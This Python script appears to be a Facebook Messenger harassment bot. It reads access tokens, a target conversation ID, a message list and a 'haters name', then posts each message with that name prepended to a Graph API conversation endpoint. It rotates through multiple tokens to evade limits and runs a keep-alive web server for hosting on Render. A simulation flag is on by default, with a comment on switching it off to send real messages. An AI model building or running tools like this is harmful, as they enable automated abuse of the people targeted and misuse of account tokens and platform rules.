import requests
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
from datetime import datetime

# Log messages with timestamps
def log(message):
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}")

# HTTP Server to keep Render app alive
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"CREATED BY MR PREM PROJECT")

def execute_server():
    try:
        PORT = 4000
        with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
            log(f"Server running at http://localhost:{PORT}")
            httpd.serve_forever()
    except Exception as e:
        log(f"HTTP server error: {e}")

# Read file contents with error handling
def read_file(filename):
    try:
        with open(filename, 'r') as file:
            return file.read().strip()
    except FileNotFoundError:
        log(f"Error: File '{filename}' not found.")
        sys.exit()
    except Exception as e:
        log(f"Error reading file '{filename}': {e}")
        sys.exit()

# Clear the console
def clear_console():
    if system() == "Linux":
        os.system("clear")
    elif system() == "Windows":
        os.system("cls")

# Send a single message
def send_message(api_url, headers, payload, offline_mode, idx, message):
    if offline_mode:
        # Offline simulation
        log(f"[SIMULATION] Message {idx + 1}: {message}")
    else:
        try:
            response = requests.post(api_url, json=payload, headers=headers)
            if response.ok:
                log(f"[+] Message {idx + 1} sent: {message}")
            else:
                log(f"[x] Failed to send message {idx + 1}: {response.status_code} {response.text}")
        except requests.RequestException as e:
            log(f"[!] Error sending message {idx + 1}: {e}")

# Main message-sending logic
def send_messages():
    try:
        # Validate the password
        correct_password = read_file("password.txt")
        entered_password = correct_password  # Replace with user input for real scenarios
        if entered_password != correct_password:
            log("[-] WRONG PASSWORD. TRY AGAIN.")
            sys.exit()

        # Read all required files
        tokens = read_file("token.txt").splitlines()
        convo_id = read_file("convo.txt")
        text_file_path = read_file("file.txt")
        messages = read_file(text_file_path).splitlines()
        haters_name = read_file("hatersname.txt")
        speed = int(read_file("time.txt"))

        # Validate inputs
        if not tokens or not messages:
            raise ValueError("Token or message file is empty.")

        headers = {
            "User-Agent": "Mozilla/5.0",
            "referer": "www.google.com"
        }
        api_url_template = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        offline_mode = True  # Change to False to send actual messages

        clear_console()

        # Main loop: Send messages using tokens in a round-robin manner
        token_index = 0
        for idx, message in enumerate(messages):
            token = tokens[token_index]
            token_index = (token_index + 1) % len(tokens)  # Move to the next token
            payload = {"access_token": token, "message": f"{haters_name} {message}"}
            send_message(api_url_template, headers, payload, offline_mode, idx, f"{haters_name} {message}")
            time.sleep(speed)  # Delay between messages

        log("[+] All messages sent. Exiting...")

    except ValueError as e:
        log(f"[!] Value Error: {e}")
    except Exception as e:
        log(f"[!] Unexpected Error: {e}")

# Main entry point
def main():
    try:
        # Start the HTTP server in a separate thread
        server_thread = threading.Thread(target=execute_server, daemon=True)
        server_thread.start()

        # Start the message-sending logic
        send_messages()
    except KeyboardInterrupt:
        log("Exiting... (Interrupted by user)")
    except Exception as e:
        log(f"[!] Unexpected Error in main: {e}")

if __name__ == "__main__":
    main()
